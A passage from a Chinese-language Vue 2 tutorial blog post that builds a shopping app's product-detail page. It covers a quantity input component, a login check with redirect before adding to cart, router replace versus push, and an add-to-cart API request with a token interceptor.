#D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">showPannel</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">true</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">mode</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">'cart'</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">buyNow</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">showPannel</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">true</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">mode</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">'buy'</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span></code></pre></div></div></figure><p>接下来还需要将弹层中的数量展示封装成数字框组件。</p><h2 id="数字框组件封装"><a class="markdownIt-Anchor" href="#数字框组件封装"></a> 数字框组件封装</h2><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408310106195.png" alt="image-20240831010611047"><br>分析：组件名 CountBox</p><ol><li>静态结构，左中右三部分</li><li>数字框的数字，应该是外部传递进来的 (父传子)</li><li> 点击 <code>+－</code>号，可以修改数字（子传父)</li><li> 使用 <code>v-model</code> 实现封装（<code>:value</code> 和 <code>@input</code> 的简写）</li><li>数字不能减到小于 1</li></ol><p>封装组件 <code>components/CountBox.vue</code></p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"count-box"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">handleSub</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"minus"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">-</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">input</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> @</span><span style="color: #9CDCFE">change</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">handleChange</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"inp"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"text"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">handleAdd</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"add"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">+</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">props:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">value:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">type:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">Number</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">default:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">methods:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">handleSub</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4"> &lt;= </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">$emit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"input"</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4"> - </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">handleAdd</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">$emit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"input"</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4"> + </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">handleChange</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log(e.target.value)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">num</span><span style="color: #D4D4D4"> = +</span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">target</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 转数字处理 (1) 数字 (2) NaN</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 输入了不合法的文本 或 输入了负值，回退成原来的 value 值</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #DCDCAA">isNaN</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">num</span><span style="color: #D4D4D4">) || </span><span style="color: #9CDCFE">num</span><span style="color: #D4D4D4"> &lt; </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">target</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">$emit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"input"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">num</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">style</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"less"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">scoped</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D7BA7D">.count-box</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">110px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.add</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.minus</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">30px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">30px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">outline</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#efefef</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.inp</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">30px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">outline</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#efefef</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>使用组件</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">CountBox</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'@/components/CountBox.vue'</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'ProDetail'</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">components:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">CountBox</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">addCount:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">1</span></span><span class="line"><span style="color: #D4D4D4">      ...</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"num-box"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">数量</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #4EC9B0">CountBox</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">v-model</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"addCount"</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #4EC9B0">CountBox</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><h2 id="加入购物车-判断登录状态"><a class="markdownIt-Anchor" href="#加入购物车-判断登录状态"></a> 加入购物车 - 判断登录状态</h2><p>需要使用到 vant 的 Dialog 组件</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">Dialog</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"vant"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">Dialog</span><span style="color: #D4D4D4">({ </span><span style="color: #9CDCFE">message:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"提示"</span><span style="color: #D4D4D4"> });</span></span></code></pre></div></div></figure><p>给弹层的加入购物车按钮绑定点击事件</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"btn"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"this.mode === 'cart'"</span><span style="color: #D4D4D4"> </span><span style="color: #F44747">@click="addCart"&gt;加入购物车&lt;/div&gt;</span></span></code></pre></div></div></figure><p>添加 token 鉴权判断，跳转携带回跳地址</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 加入购物车判断登录状态</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">addCart</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log(this.$store.getters.token)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$store</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">token</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 说明没有token，没有token就需要提示登录</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$dialog</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">confirm</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">message:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'当前操作需要登录后才能进行哦'</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">confirmButtonText:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'去登录'</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">cancelButtonText:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'再逛逛'</span></span><span class="line"><span style="color: #D4D4D4">        }).</span><span style="color: #DCDCAA">then</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #6A9955">// 说明点击了去登录，需要带上backUrl</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">replace</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">path:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'/login'</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">query:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #9CDCFE">backUrl:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$route</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">fullPath</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955">// 带上当前页面的全路径（包括查询参数）</span></span><span class="line"><span style="color: #D4D4D4">            }</span></span><span class="line"><span style="color: #D4D4D4">          })</span></span><span class="line"><span style="color: #D4D4D4">        })</span></span><span class="line"><span style="color: #D4D4D4">          .</span><span style="color: #DCDCAA">catch</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #6A9955">// 说明点击了再逛逛，不做任何操作</span></span><span class="line"><span style="color: #D4D4D4">          })</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span></code></pre></div></div></figure><p>登录后如果有回跳地址则 replace 地回跳回去：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 判断有无回跳地址</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">url</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$route</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">query</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">backUrl</span><span style="color: #D4D4D4"> || </span><span style="color: #CE9178">"/"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">replace</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">url</span><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure><h2 id="thisrouterreplace和thisrouterpush的区别"><a class="markdownIt-Anchor" href="#thisrouterreplace和thisrouterpush的区别"></a> <code>this.$router.replace</code> 和 <code>this.$router.push</code> 的区别</h2><p>假设有 A、B、C 三个页面。</p><p>我从 A 点击进入 B 页面，然后在 B 页面需要进行跳转到 C 页面，此时我触发的是 <code>this.$router.replace</code> 进行跳转，那么跳转到 C 之后 C 就会将 B 的访问记录完全覆盖。如果我在 C 页面的操作结束之后，进行返回上一页的操作，就会直接返回到 A 页面而不是 B 页面。</p><p>相对的，<code>this.$router.push</code> 则会将记录保持，你的每次访问都是一个累加的过程，不会清除。</p><p>如果把页面比作真实的纸张，跳转的过程就像把我们手里的一张纸覆盖到桌子上的另一张纸上面一样，桌子上纸张堆的是已经访问过的页面，桌子上的纸张堆中最上面那一张就是我们现在正在访问的页面，而手里的是将要访问的页面。但覆盖的方式上述两种各有不同：<code>replace</code> 会在覆盖桌子上的纸张之前将桌子上最上面的那一张丢到垃圾桶，然后再将手中的纸张覆盖上去；<code>push</code> 则是简单的将纸张放在桌子上的纸张上面，不进行其他任何操作，最终你的访问记录都在桌子上。</p><h2 id="加入购物车-封装接口进行请求"><a class="markdownIt-Anchor" href="#加入购物车-封装接口进行请求"></a> 加入购物车 - 封装接口进行请求</h2><p>接口如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408310106434.png" alt="image-20240830232641136"></p><p>封装加入购物车的请求接口模块 <code>api/cart.js</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 加入购物车的请求</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/utils/request"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">addCart</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">goodsNum</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">goodsSkuId</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// goodsId: 商品id, goodsNum: 商品数量, goodsSkuId: 商品规格id 如红色手机</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">post</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/cart/add"</span><span style="color: #D4D4D4">, {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">goodsNum</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">goodsSkuId</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>由于需要携带请求头且携带的是鉴权信息，每次请求手动去写比较麻烦，所以直接在请求拦截器中携带 <code>utils/request.js</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">store</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/store"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 只要有token就在请求中携带，便于请求需要权限的接口</span></span><span 